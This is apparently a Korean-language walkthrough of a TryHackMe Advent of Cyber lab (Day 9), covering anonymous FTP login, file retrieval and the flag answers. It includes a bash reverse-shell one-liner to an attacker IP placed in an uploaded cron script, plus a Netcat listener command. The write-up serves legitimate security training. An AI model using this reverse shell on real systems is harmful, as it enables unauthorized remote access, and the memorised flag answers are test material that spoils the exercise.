# Day 9 | Networking Anyone can be Santa!

## Workstation
- Virtual Box : VMware Fusion 12.1.2
- OS : kali-linux-2021.2

## Walkthrough
![attackbox](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/attackbox.png)

### Question #1: Name the directory on the FTP server that has data accessible by the "anonymous" user

> public

```
$ sudo ftp 10.10.65.80
```

위 명령어 사용 후 `anonymous`로 로그인 한다.

![anonymous](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/anonymous.png)

### Question #2: What script gets executed within this directory?

> backup.sh

로그인 성공 후 디렉터리를 조사하면 2개의 파일을 찾을 수 있는데 실행 가능한 파일은 `backup.sh` 이다.

![ls](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/ls.png)

### Question #3: What movie did Santa have on his Christmas shopping list?

> The Polar Express

디렉터리 안에 2개의 파일 중 shoppinglist.txt 파일을 `get` 명령어로 다운받아 확인한다.

![list](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/list.png)

![catlist](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/catlist.png)

### Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

> THM{even_you_can_be_santa}

backup.sh 파일을 다운받는다.

![backup](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/backup.png)

![catbackup](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/catbackup.png)

리버스쉘을 얻기 위해 vi 편집기를 사용해 코드를 변경해준다.

```
#!/bin/bash

bash -i >& /dev/tcp/MY_IP/4444 0>&1
```

![bash](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/bash.png)

그리고 편집한 backup.sh 파일을 업로드하기 전 새로운 터미널을 열어 4444번 포트로 Netcat을 실행해 준다.

```
$ sudo nc -lvnp 4444
```

![nc](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/nc.png)

Netcat 리스너를 실행 후 ftp로 다시 접속해 `put` 명령어로 변경한 파일 backup.sh를 업로드 해준다.

![put](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/put.png)

업로드가 되면 Netcat 리스너에서 리버스쉘을 접속해 flag를 얻을 수 있다.

![flag](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%209/image/flag.png)
